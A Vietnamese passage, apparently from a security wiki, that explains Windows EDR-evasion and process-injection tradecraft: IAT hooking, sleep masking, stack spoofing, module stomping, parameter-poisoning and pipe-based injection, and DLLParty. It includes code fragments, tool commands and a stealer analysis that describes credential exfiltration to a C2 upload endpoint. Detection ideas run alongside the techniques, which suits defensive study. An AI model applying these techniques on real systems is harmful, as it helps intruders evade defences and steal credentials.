- Dùng chuyển đổi RW → RX cho PIC và tránh để lại các trang vừa writable vừa executable.

Stub giả mạo call stack
- Các PIC stub kiểu Draugr dựng call chain giả (các địa chỉ trả về nằm trong module lành tính), rồi chuyển sang API thật.
- Cách này đánh lừa các cơ chế phát hiện vốn mong đợi stack chuẩn từ Beacon/BOF khi gọi các API nhạy cảm.
- Kết hợp với kỹ thuật cắt stack/ghép stack để đi vào các frame dự kiến trước phần prologue của API.

Tích hợp vận hành
- Đặt reflective loader ở đầu các DLL post-ex để PIC và hook tự khởi tạo khi DLL được tải.
- Dùng script Aggressor để đăng ký các API đích, giúp Beacon và BOF hưởng lợi minh bạch từ cùng một đường né tránh mà không cần sửa code.

Các lưu ý về phát hiện/DFIR
- Tính toàn vẹn IAT: các entry phân giải thành địa chỉ không thuộc image (heap/anon); xác minh định kỳ các con trỏ import.
- Bất thường stack: địa chỉ trả về không thuộc các image đã tải; chuyển đột ngột sang PIC không thuộc image; chuỗi tổ tiên RtlUserThreadStart không nhất quán.
- Telemetry của loader: ghi vào IAT trong tiến trình; hoạt động DllMain sớm sửa đổi import thunk; vùng RX bất ngờ được tạo khi tải.
- Né tránh image-load: nếu hooking LoadLibrary*, hãy giám sát các lần tải đáng ngờ automation/clr assembly có tương quan với các sự kiện che giấu bộ nhớ.

Các khối xây dựng và ví dụ liên quan
- Reflective loader thực hiện vá IAT trong lúc tải (ví dụ: TitanLdr, AceLdr)
- Hook che giấu bộ nhớ (ví dụ: simplehook) và PIC cắt stack (stackcutting)
- PIC stub giả mạo call stack (ví dụ: Draugr)


## Hooking IAT lúc import + che giấu Sleep (Crystal Palace/PICO)

### Hook IAT lúc import thông qua PICO thường trú

Nếu kiểm soát reflective loader, bạn có thể hook import **trong lúc** `ProcessImports()` bằng cách thay con trỏ `GetProcAddress` của loader bằng một custom resolver kiểm tra hook trước:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Tạo một **PICO thường trú** (đối tượng PIC liên tục tồn tại) để sống sót sau khi transient loader PIC tự giải phóng.
- Export hàm `setup_hooks()` để ghi đè import resolver của loader (ví dụ: `funcs.GetProcAddress = _GetProcAddress`).
- Trong `_GetProcAddress`, bỏ qua import theo ordinal và dùng tra cứu hook dựa trên hash như `__resolve_hook(ror13hash(name))`. Nếu có hook, trả về hook đó; nếu không, chuyển tiếp đến `GetProcAddress` thật.
- Đăng ký các đích hook lúc link bằng các entry Crystal Palace `addhook "MODULE$Func" "hook"`. Hook vẫn hợp lệ vì nằm bên trong PICO thường trú.

Cách này tạo **chuyển hướng IAT lúc import** mà không cần vá phần code của DLL đã tải sau khi tải xong.

### Buộc tạo import có thể hook khi target dùng PEB-walking

Hook lúc import chỉ được kích hoạt nếu hàm thực sự nằm trong IAT của target. Nếu một module phân giải API bằng PEB-walk + hash (không có import entry), hãy buộc tạo một import thực để loader xử lý nó qua đường `ProcessImports()`:

- Thay việc phân giải export bằng hash (ví dụ: `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) bằng tham chiếu trực tiếp như `&WaitForSingleObject`.
- Compiler sẽ tạo IAT entry, cho phép chặn khi reflective loader phân giải import.

### Che giấu lúc ngủ/nhàn rỗi kiểu Ekko mà không vá `Sleep()`

Thay vì vá `Sleep`, hãy hook các **primitive wait/IPC thực tế** mà implant sử dụng (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Với các lần chờ dài, bọc lời gọi bằng chuỗi che giấu kiểu Ekko để mã hóa image trong bộ nhớ khi nhàn rỗi:<sup>[[31]](#references)[[27]](#references)</sup>

- Dùng `CreateTimerQueueTimer` để lên lịch một chuỗi callback gọi `NtContinue` với các frame `CONTEXT` được tạo sẵn.
- Chuỗi thường dùng (x64): đặt image thành `PAGE_READWRITE` → mã hóa RC4 bằng `advapi32!SystemFunction032` trên toàn bộ image đã map → thực hiện thao tác chờ blocking → giải mã RC4 → **khôi phục quyền từng section** bằng cách duyệt các section PE → báo hiệu hoàn tất.
- `RtlCaptureContext` cung cấp một `CONTEXT` mẫu; sao chép nó thành nhiều frame và đặt các register (`Rip/Rcx/Rdx/R8/R9`) để gọi từng bước.

Chi tiết vận hành: trả về “success” cho các lần chờ dài (ví dụ: `WAIT_OBJECT_0`) để caller tiếp tục trong khi image đang được che giấu. Mẫu này ẩn module khỏi scanner trong các khoảng nhàn rỗi và tránh dấu hiệu đặc trưng của kiểu “đã vá `Sleep()`”.

Ý tưởng phát hiện (dựa trên telemetry)
- Các đợt callback `CreateTimerQueueTimer` trỏ đến `NtContinue`.
- `advapi32!SystemFunction032` được dùng trên các buffer lớn liên tục có kích thước bằng image.
- `VirtualProtect` trên vùng lớn, sau đó khôi phục quyền riêng cho từng section.

### Đăng ký CFG lúc runtime cho gadget che giấu khi ngủ

Trên các target bật CFG, lần nhảy gián tiếp đầu tiên vào gadget giữa hàm như `jmp [rbx]` hoặc `jmp rdi` thường làm tiến trình crash với `STATUS_STACK_BUFFER_OVERRUN` vì gadget không có trong metadata CFG của module. Để giữ cho các chain kiểu Ekko/Kraken hoạt động bên trong các tiến trình được harden:<sup>[[30]](#references)</sup>

- Đăng ký mọi đích gián tiếp mà chain sử dụng bằng `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` cùng các entry `CFG_CALL_TARGET_VALID`.
- Với các địa chỉ nằm trong image đã tải (`ntdll`, `kernel32`, `advapi32`), `MEMORY_RANGE_ENTRY` phải bắt đầu tại **image base** và bao phủ **toàn bộ kích thước image**.
- Với các vùng được map thủ công/PIC/stomp, thay vào đó hãy dùng **allocation base** và kích thước allocation.
- Đánh dấu không chỉ dispatch gadget mà cả các export được gọi gián tiếp (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, các wait/event syscall) và mọi section executable do attacker kiểm soát sẽ trở thành đích gián tiếp.

Điều này biến các sleep chain kiểu ROP/JOP từ “chỉ hoạt động trong tiến trình không có CFG” thành primitive có thể tái sử dụng cho `explorer.exe`, trình duyệt, `svchost.exe` và các endpoint khác được biên dịch với `/guard:cf`.

### Giả mạo stack an toàn với CET cho thread đang ngủ

Thay thế toàn bộ `CONTEXT` dễ bị phát hiện và có thể gây lỗi trên hệ thống CET Shadow Stack vì `Rip` giả mạo vẫn phải khớp với hardware shadow stack. Mẫu che giấu khi ngủ an toàn hơn là:<sup>[[30]](#references)</sup>

- Chọn một thread khác trong cùng tiến trình và đọc giới hạn stack `NT_TIB` / TEB (`StackBase`, `StackLimit`) thông qua `NtQueryInformationThread`.
- Sao lưu TEB/TIB thật của thread hiện tại.
- Chụp context thật của thread đang ngủ bằng `GetThreadContext`.
- Chỉ sao chép `Rip` thật vào context giả, giữ nguyên `Rsp`/trạng thái stack giả mạo.
- Trong khoảng thời gian ngủ, sao chép `NT_TIB` của thread giả mạo vào TEB hiện tại để stack walker unwind bên trong một vùng stack hợp lệ.
- Sau khi thao tác chờ kết thúc, khôi phục TIB và thread context ban đầu.

Cách này giữ instruction pointer nhất quán với CET, đồng thời đánh lừa stack walker của EDR vốn dựa vào metadata stack trong TEB để xác thực quá trình unwind.

### Phương án thay thế dựa trên APC: Kraken Mask

Nếu việc dispatch bằng timer-queue quá dễ bị nhận diện, có thể thực hiện cùng chuỗi ngủ-mã hóa-giả mạo-khôi phục từ một helper thread bị suspend bằng các APC được xếp hàng:<sup>[[27]](#references)</sup>

- Tạo helper thread với `NtTestAlert` làm entrypoint.
- Xếp hàng các frame `CONTEXT`/APC đã chuẩn bị bằng `NtQueueApcThread` và xử lý chúng bằng `NtAlertResumeThread`.
- Lưu trạng thái chain trên heap thay vì stack của helper để tránh làm cạn stack thread mặc định 64 KB.
- Dùng `NtSignalAndWaitForSingleObject` để báo hiệu event bắt đầu và block một cách nguyên tử.
- Suspend thread chính trước khi khôi phục TIB/context (`NtSuspendThread` → khôi phục → `NtResumeThread`) để giảm khoảng thời gian race mà scanner có thể bắt gặp stack mới khôi phục một phần.

Cách này thay dấu hiệu `CreateTimerQueueTimer` + `NtContinue` bằng dấu hiệu helper-thread/APC, đồng thời giữ nguyên mục tiêu che giấu bằng RC4 và giả mạo stack.

Ý tưởng phát hiện bổ sung
- `NtSetInformationVirtualMemory` với `VmCfgCallTargetInformation` ngay trước các khoảng ngủ, thao tác chờ hoặc dispatch APC.
- `GetThreadContext`/`SetThreadContext` được bọc quanh `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` hoặc `ConnectNamedPipe`.
- `NtQueryInformationThread` theo sau bởi các thao tác ghi trực tiếp vào giới hạn stack TEB/TIB của thread hiện tại.
- Các chain `NtQueueApcThread`/`NtAlertResumeThread` gián tiếp gọi đến `SystemFunction032`, `VirtualProtect` hoặc helper khôi phục quyền section.
- Dùng lặp lại các dấu hiệu gadget ngắn như `FF 23` (`jmp [rbx]`) hoặc `FF E7` (`jmp rdi`) làm dispatch pivot bên trong các module đã ký.


## Stomping module chính xác

Module stomping thực thi payload từ **section `.text` của một DLL đã được map trong tiến trình target** thay vì cấp phát vùng nhớ executable private dễ nhận thấy hoặc tải một DLL hy sinh mới. Đích bị ghi đè nên là một **image đã tải, được hỗ trợ bởi file trên đĩa**, có vùng code đủ lớn để chứa payload mà không làm hỏng các đường code mà tiến trình vẫn cần.<sup>[[1]](#references)[[2]](#references)</sup>

### Chọn target đáng tin cậy

Stomping ngây thơ lên các module phổ biến như `uxtheme.dll` hoặc `comctl32.dll` rất dễ lỗi: DLL có thể chưa được tải trong tiến trình từ xa, hoặc vùng code quá nhỏ có thể làm tiến trình crash. Quy trình đáng tin cậy hơn:

1. Liệt kê các module của tiến trình target và chỉ giữ lại các DLL đã tải có tên nằm trong danh sách include.
2. Tạo payload trước và ghi lại **kích thước byte chính xác** của nó.
3. Quét các DLL trên đĩa và so sánh section PE **`.text` `Misc_VirtualSize`** với kích thước payload. Thông tin này quan trọng hơn kích thước file vì nó phản ánh kích thước của section executable **khi được map vào bộ nhớ**.
4. Phân tích **Export Address Table (EAT)** và chọn RVA của một hàm export làm offset bắt đầu stomping.
5. Tính **phạm vi ảnh hưởng**: nếu payload vượt quá ranh giới của hàm được chọn, nó sẽ ghi đè các export liền kề được bố trí phía sau trong bộ nhớ.

Các helper do thám/chọn target thường thấy ngoài thực tế:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

Operational notes
- Ưu tiên các DLL **đã được tải** trong tiến trình từ xa để tránh telemetry từ `LoadLibrary`/việc tải image bất ngờ.
- Ưu tiên các export mà ứng dụng đích hiếm khi thực thi; nếu không, các đường dẫn code thông thường có thể chạm vào các byte đã bị stomp trước hoặc sau khi tạo thread.
- Implant lớn thường cần đổi cách nhúng shellcode từ string literal sang **byte-array/braced initializer** để toàn bộ buffer được biểu diễn chính xác trong mã nguồn injector.

Detection ideas
- Ghi từ xa vào các trang thực thi được hỗ trợ bởi image (`MEM_IMAGE`, `PAGE_EXECUTE*`) thay vì các vùng cấp phát RWX/RX private phổ biến hơn.
- Các entry point của export có byte trong bộ nhớ không còn khớp với file backing trên đĩa.
- Remote thread hoặc context pivot bắt đầu thực thi bên trong một export DLL hợp lệ có các byte đầu vừa bị sửa đổi.
- Các chuỗi `VirtualProtect(Ex)` / `WriteProcessMemory` đáng ngờ nhắm vào các trang `.text` của DLL, sau đó tạo thread.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) là kỹ thuật **process-injection / EDR-evasion**, tránh đường ghi từ xa cổ điển (`VirtualAllocEx` + `WriteProcessMemory`). Thay vì sao chép byte vào một tiến trình đích đang chạy, kỹ thuật này lợi dụng việc Windows **sao chép một số tham số khởi chạy của `CreateProcessW` vào tiến trình con** và lưu chúng bên trong `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).<sup>[[28]](#references)[[29]](#references)</sup>

### Các carrier có thể bị poison được `CreateProcessW` sao chép

Các carrier hữu ích gồm:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (với `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Các ràng buộc thực tế của carrier:

- `lpCommandLine` phải trỏ đến **bộ nhớ có thể ghi** để dùng với `CreateProcessW`, và bị giới hạn ở **32,767 ký tự Unicode**, tính cả ký tự kết thúc null.
- `lpEnvironment` phải là một environment block Unicode gồm các chuỗi `NAME=VALUE\0` nối tiếp nhau, kết thúc bằng một `\0` bổ sung.
- `lpReserved` chính thức được dành riêng, vì vậy nên xem ánh xạ `ShellInfo` là chi tiết triển khai thay vì một cam kết ổn định được tài liệu hóa.

Điều này biến việc tạo tiến trình thông thường thành **primitive truyền payload**. Operator tạo tiến trình con với dữ liệu khởi chạy do attacker kiểm soát và để Windows thực hiện việc sao chép liên tiến trình.

### Luồng tra cứu từ xa không dùng API ghi từ xa

Sau khi tiến trình con được tạo, hãy resolve buffer đã sao chép bằng các primitive **chỉ đọc**:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → lấy `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Đọc `PEB` từ xa
3. Theo con trỏ `PEB.ProcessParameters`
4. Đọc `RTL_USER_PROCESS_PARAMETERS`
5. Dùng con trỏ đã chọn:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

Luồng tối thiểu:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### Thực thi vùng đệm tham số đã sao chép

Vùng tham số được sao chép thường có quyền `RW`, không thể thực thi. Một chuỗi P3 phổ biến là:

1. Tạo tiến trình bình thường (không ở trạng thái tạm dừng)
2. Cấp quyền thực thi cho trang tham số đã chọn bằng `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Dùng lại handle của luồng chính đã được trả về trong `PROCESS_INFORMATION`
4. Chuyển hướng thực thi bằng `NtSetContextThread` (`CONTEXT_CONTROL`, ghi đè `RIP`)

Không giống các quy trình thread hijacking cổ điển, cách này **không yêu cầu** `SuspendThread` / `ResumeThread`; có thể thay đổi context trực tiếp trên handle của luồng chính được trả về.

Cách này tránh một số API thường bị giám sát khi thực hiện injection:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- thường cả `SuspendThread` / `ResumeThread`

### Giới hạn byte null và shellcode theo giai đoạn

Cả ba carrier đều là **dữ liệu dạng chuỗi hoặc tương tự chuỗi**, nên payload thô có chứa `0x00` sẽ bị cắt cụt trong quá trình truyền. Một giải pháp thực tế là dùng **giai đoạn đầu không chứa byte null**, tái tạo các hằng số khi chạy, rồi nạp một giai đoạn thứ hai tùy ý.

Một mẫu đơn giản là tổng hợp hằng số dựa trên XOR:

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

Điều này cho phép stage đầu tiên tạo chuỗi trên stack, đối số API, đường dẫn DLL hoặc trình nạp shellcode stage thứ hai mà không nhúng byte null vào tham số được truyền.

### Gọi API dựa trên stack từ stage đầu tiên

Khi stage đầu tiên cần gọi các API như `LoadLibraryA`, nó có thể:

- đẩy chuỗi/buffer lên stack của tiến trình đích
- dành **32-byte x64 shadow space**
- đặt `RCX`, `RDX`, `R8`, `R9` thành hằng số hoặc con trỏ tương đối với `RSP`
- giữ `RSP` **căn chỉnh 16 byte** trước khi gọi

Sau đó, stage thứ hai có thể được sao chép từ stack vào vùng cấp phát `PAGE_READWRITE`, chuyển thành `PAGE_EXECUTE_READ` bằng `VirtualProtect`, rồi nhảy đến đó, tránh cấp phát RWX trực tiếp.

### Ý tưởng phát hiện

Các cơ hội săn tìm đáng chú ý được tác giả đề cập:

- `VirtualProtectEx` / `NtProtectVirtualMemory` đặt **các trang tham số tiến trình thành có thể thực thi**
- thay đổi quyền bảo vệ đó, sau đó gọi `SetThreadContext` / `NtSetContextThread`
- đọc từ xa `PEB`, rồi đến `RTL_USER_PROCESS_PARAMETERS`
- các giá trị `lpCommandLine`, `lpEnvironment` hoặc `STARTUPINFO.lpReserved` dài bất thường / có entropy cao trong lúc tạo tiến trình

### Ghi chú

- P3 là một **mẹo truyền dữ liệu liên tiến trình**, bản thân nó không phải primitive thực thi hoàn chỉnh: tham số được sao chép vẫn cần được đổi quyền cho phép thực thi và cần có phương thức chuyển hướng thực thi.
- Tác giả đã cân nhắc `RtlCreateProcessReflection` / Dirty Vanity nhưng loại bỏ vì bên trong nó gọi đến các primitive đáng ngờ như `NtWriteVirtualMemory` và `NtCreateThreadEx`.

Để chuyển payload vào một tiến trình Windows **đang tồn tại** thông qua mô tả thread, sau đó chiếm quyền địa chỉ trả về của thread đang chờ, xem [Thread Name-Calling and Waiting Thread Hijacking](windows-process-injection-thread-name-calling-waiting-thread-hijacking.md).

## Tiêm mã qua pipe STDIN của console

Một tiến trình con console tương tác cũng có thể được dùng làm **primitive truyền payload**. Injector chuyển hướng standard input của tiến trình con đến một pipe rồi gửi một marker theo sau là shellcode. Sau khi chương trình console đọc dữ liệu vào bộ nhớ riêng của nó, injector tìm buffer đó, đặt quyền thực thi cho nó rồi chuyển hướng một thread của tiến trình con đến đó. Cách này tránh dùng `VirtualAllocEx` và `WriteProcessMemory`, nhưng vẫn là process injection chứ không phải một phương thức EDR bypass tổng quát.<sup>[[41]](#references)</sup>

Dù được mô tả là "named-pipe", implementation tham chiếu gọi `CreatePipe`, hàm này tạo một **anonymous pipe**. Windows triển khai anonymous pipe bằng các đối tượng pipe có tên duy nhất ở bên trong, nhưng PoC không chọn đường dẫn `\\.\pipe\<name>` và cũng không gọi `CreateNamedPipe`. Nó tạo các handle có thể kế thừa với security descriptor mặc định, đặt handle đọc vào `STARTUPINFO.hStdInput`, đặt `STARTF_USESTDHANDLES`, rồi khởi chạy một tiến trình con mới với tính năng kế thừa handle được bật. Vì vậy, PoC khởi chạy console executable được cung cấp; nó không gắn pipe vào một tiến trình đang tồn tại.<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### Quy trình tham chiếu

Implementation sử dụng chuỗi thao tác sau:<sup>[[41]](#references)</sup>

1. Tạo các cặp anonymous pipe cho `STDIN` và `STDOUT` của tiến trình con. Tắt tính kế thừa trên hai handle phía tiến trình cha và đóng các bản sao handle phía tiến trình con trong tiến trình cha sau khi tạo tiến trình.
2. Khởi chạy một executable tương tác như `netsh.exe` hoặc `nslookup.exe` bằng `CREATE_NEW_CONSOLE`. Tiến trình con kế thừa các standard handle đã chuyển hướng.
3. Gửi toàn bộ mảng nhị phân `rawData` bằng `WriteFile` qua handle `STDIN` phía tiến trình cha. Chương trình console nhận các byte và để lại một bản sao trong một trong các vùng bộ nhớ riêng đã commit của nó.
4. Duyệt không gian địa chỉ của tiến trình con bằng `VirtualQueryEx`, đọc các vùng `MEM_PRIVATE` tiềm năng bằng `ReadProcessMemory`, rồi tìm marker ở đầu `rawData`.
5. Đổi quyền của buffer được tìm thấy thành `PAGE_EXECUTE_READWRITE` bằng `VirtualProtectEx`.
6. Xác định main thread, tạm dừng nó, đặt `RIP` thành `found_address + 0x19` bằng `NtSetContextThread`, rồi tiếp tục thread.

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

Triển khai được cung cấp chỉ dành cho x64: nó sửa đổi `CONTEXT.Rip`, còn payload nhúng là shellcode x64. `rawData` bắt đầu bằng marker dài 25 byte, nên các byte thực thi bắt đầu tại offset hexadecimal `0x19`. Khi thay payload, hãy giữ nguyên bố cục đó hoặc cập nhật đồng bộ marker, search vector, kích thước mảng và offset thực thi. Các chú thích trong mã nguồn cũng liệt kê `0x0A`, `0x0D` và `0x1A` là các ký tự không hợp lệ. Workflow này không thay đổi token hoặc đặc quyền của tiến trình con.<sup>[[41]](#references)</sup>

Để xem các helper native nhỏ và mẫu biên dịch payload, hãy tham khảo [Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md).

## DLL injection bằng thread-pool callback không cần shellcode (DLLParty)

DLLParty điều chỉnh kỹ thuật thread-pool injection kiểu PoolParty để khiến một worker hiện có của tiến trình đích gọi `LoadLibraryA`, thay vì thực thi callback stub được inject. Primitive dispatch của nó là một completion `TP_DIRECT` được xếp vào I/O completion port của pool đích. Cách này không vượt qua quyền truy cập tiến trình: PoC gọi `OpenProcess(PROCESS_ALL_ACCESS)` và cần quyền đọc/ghi bộ nhớ đích, cùng các handle worker-factory và completion-port có thể được duplicate.<sup>[[46]](#references)[[47]](#references)</sup>

Trên Windows x64, worker truyền con trỏ tới `TP_CALLBACK_INSTANCE` nằm trên stack vào `RCX`, đối số callback đầu tiên. `LoadLibraryA` diễn giải cùng con trỏ đó thành một `LPCSTR`. Trên đường thực thi đã kiểm thử, `TppWorkerThread` tạo con trỏ tại `RSP+0x178`, trong khi lần ghi thông thường đầu tiên vào đối tượng này diễn ra tại `RSP+0x1d0`. Vì vậy, đường dẫn DLL kết thúc bằng null và vừa trong vùng 0x58 byte này có thể nằm ở đầu instance mà không bị ghi đè trước khi dispatch. Đây là quan sát cụ thể theo một bản build, không phải đảm bảo được Windows ABI tài liệu hóa.<sup>[[46]](#references)[[47]](#references)</sup>

Workflow tham chiếu như sau:<sup>[[46]](#references)[[47]](#references)</sup>

1. Liệt kê các handle của tiến trình đích bằng `NtQuerySystemInformation(SystemHandleInformation)` và xác định `TpWorkerFactory` bằng cách truy vấn loại đối tượng. Duplicate một handle worker-factory rồi truy vấn `WorkerFactoryBasicInformation`; `StartParameter` cung cấp `TP_POOL` từ xa. Bỏ qua các factory có `TotalWorkerCount == 0`.
2. Đọc `TP_POOL.CompletionPort` và duyệt danh sách worker riêng của pool. Trên bản build Windows 10 19045 x64 đã kiểm thử (`ntdll.dll 10.0.19041.4842`), head của danh sách nằm tại `pool+0x60`; mỗi link nằm tại `worker+0x10`, vì vậy slot callback-instance tại `worker+0x38` bằng `link+0x28`. PoC kiểm tra căn chỉnh con trỏ, tính tương hỗ của các link, quyền sở hữu pool, thread ID khác 0, node lặp lại và head danh sách ổn định.
3. Ghi đường dẫn DLL vào **mọi** slot worker tìm được vì bất kỳ worker nào cũng có thể nhận completion đã xếp hàng. Đặt một `TP_DIRECT` có `Callback = LoadLibraryA` trong vùng nhớ có thể ghi của tiến trình đích. PoC dùng `last_slot-0x500` trên stack của worker thay vì `VirtualAllocEx`; offset này là thử nghiệm và không được đè lên dữ liệu stack đang hoạt động.
4. Duplicate handle completion-port của tiến trình đích rồi gọi `ZwSetIoCompletion(port, remote_direct, 0, 0, 0)`. Địa chỉ `TP_DIRECT` từ xa là completion key. Một worker hiện có sau đó gọi `LoadLibraryA` với con trỏ callback-instance đã bị ghi đè, nạp một DLL mà tiến trình đích có thể truy cập.

PoC nhận PID đích (`DLLParty.exe <target_pid>`) và dùng đường dẫn DLL hard-code trong `DLLParty.cpp`; hãy đặt đường dẫn mà tiến trình đích có thể truy cập trước khi build executable x64. PoC cũng dùng địa chỉ `LoadLibraryA` trong tiến trình của chính nó làm callback từ xa, do đó giả định địa chỉ đó hợp lệ trong tiến trình đích. Mã không kiểm tra độ dài đường dẫn so với vùng 0x58 byte, cũng không kiểm tra liệu quá trình duyệt worker có tìm được slot nào trước khi truy cập phần tử cuối hay không. Hãy xác minh lại các offset riêng, bố cục stack và vùng nhớ có thể ghi cho bản build đích. Không dùng `CreateRemoteThreadEx`, shellcode và `VirtualAllocEx` không loại bỏ các thao tác ghi liên tiến trình hoặc telemetry về việc nạp DLL.<sup>[[46]](#references)[[47]](#references)</sup>

## Thủ thuật của SantaStealer để né tránh không file và đánh cắp thông tin xác thực

SantaStealer (còn gọi là BluelineStealer) cho thấy các info-stealer hiện đại kết hợp AV bypass, anti-analysis và truy cập thông tin xác thực trong cùng một workflow.<sup>[[24]](#references)</sup>

### Lọc theo bố cục bàn phím và trì hoãn trong sandbox

- Một cờ cấu hình (`anti_cis`) liệt kê các bố cục bàn phím đã cài đặt thông qua `GetKeyboardLayoutList`. Nếu tìm thấy bố cục Cyrillic, mẫu tạo một marker `CIS` rỗng rồi kết thúc trước khi chạy stealer, đảm bảo nó không kích hoạt trên các locale bị loại trừ, đồng thời để lại artifact phục vụ hunting.

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Logic `check_antivm` nhiều lớp

- Biến thể A duyệt danh sách tiến trình, băm tên từng tiến trình bằng checksum cuộn tùy chỉnh rồi so sánh với các danh sách chặn được nhúng dành cho debugger/sandbox; nó lặp lại checksum với tên máy tính và kiểm tra các thư mục làm việc như `C:\analysis`.
- Biến thể B kiểm tra các thuộc tính hệ thống (ngưỡng số lượng tiến trình, thời gian hoạt động gần đây), gọi `OpenServiceA("VBoxGuest")` để phát hiện VirtualBox additions và kiểm tra thời gian quanh các lần sleep nhằm phát hiện single-stepping. Nếu phát hiện bất kỳ dấu hiệu nào, quá trình sẽ dừng trước khi các module khởi chạy.

### Helper không file + reflective loading hai lớp ChaCha20

- DLL/EXE chính chứa một helper lấy thông tin xác thực của Chromium, có thể được ghi ra đĩa hoặc map thủ công vào bộ nhớ; ở chế độ không file, chương trình tự xử lý việc phân giải imports/relocations để không tạo artifact của helper.
- Helper đó lưu một DLL giai đoạn hai được mã hóa hai lần bằng ChaCha20 (hai khóa 32 byte + nonce 12 byte). Sau cả hai lượt giải mã, nó reflective-load blob (không dùng `LoadLibrary`) và gọi các export `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` có nguồn gốc từ [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
- Các routine ChromElevator dùng direct-syscall reflective process hollowing để inject vào một trình duyệt Chromium đang chạy, kế thừa khóa AppBound Encryption và giải mã trực tiếp mật khẩu/cookie/thẻ tín dụng từ cơ sở dữ liệu SQLite bất chấp cơ chế bảo vệ ABE.


### Thu thập trong bộ nhớ theo module & exfil HTTP chia chunk

- `create_memory_based_log` duyệt bảng con trỏ hàm toàn cục `memory_generators` và tạo một thread cho mỗi module được bật (Telegram, Discord, Steam, ảnh chụp màn hình, tài liệu, browser extension, v.v.). Mỗi thread ghi kết quả vào các buffer dùng chung và báo số lượng file sau khoảng 45 giây chờ join.
- Sau khi hoàn tất, mọi thứ được nén bằng thư viện `miniz` liên kết tĩnh thành `%TEMP%\\Log.zip`. Sau đó `ThreadPayload1` sleep 15 giây rồi truyền archive theo các chunk 10 MB qua HTTP POST đến `http://<C2>:6767/upload`, giả mạo boundary `multipart/form-data` của browser (`----WebKitFormBoundary***`). Mỗi chunk thêm `User-Agent: upload`, `auth: <build_id>`, `w: <campaign_tag>` tùy chọn; chunk cuối cùng thêm `complete: true` để C2 biết quá trình ghép lại đã hoàn tất.

## References

- [1] [Advanced Evasion Tradecraft: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Dynamic-link library search order](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Process security and access rights](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
